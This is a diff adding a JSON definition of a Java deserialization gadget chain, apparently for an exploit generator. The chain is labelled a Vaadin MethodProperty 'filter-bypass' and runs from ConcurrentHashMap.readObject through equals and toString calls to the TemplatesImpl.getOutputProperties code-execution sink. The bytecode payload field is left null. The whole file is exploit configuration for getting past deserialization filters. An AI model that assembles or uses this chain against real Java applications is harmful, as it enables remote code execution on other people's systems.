@@ -1,0 +1,25 @@
+{
+    "chain_type": "VaadinMP — ConcurrentHashMap + SimpleEntry.equals → MethodProperty.getValue → TemplatesImpl (filter-bypass)",
+    "root_class": "java.util.concurrent.ConcurrentHashMap",
+    "root_trigger": "readObject→SimpleEntry.equals→AbstractMap.equals→TextAndMnemonicHashMap.get→toString→MethodProperty.getValue",
+    "links": [
+        {
+            "class": "com.vaadin.data.util.MethodProperty",
+            "field_overrides": {
+                "instance": {"$ref": "link:1"},
+                "getMethodName": "getOutputProperties",
+                "setMethodName": null,
+                "type": "java.util.Properties"
+            }
+        },
+        {
+            "class": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+            "field_overrides": {
+                "_name": "exploit",
+                "_class": null,
+                "_bytecodes": null
+            }
+        }
+    ],
+    "sink_method": "TemplatesImpl.getOutputProperties"
+}
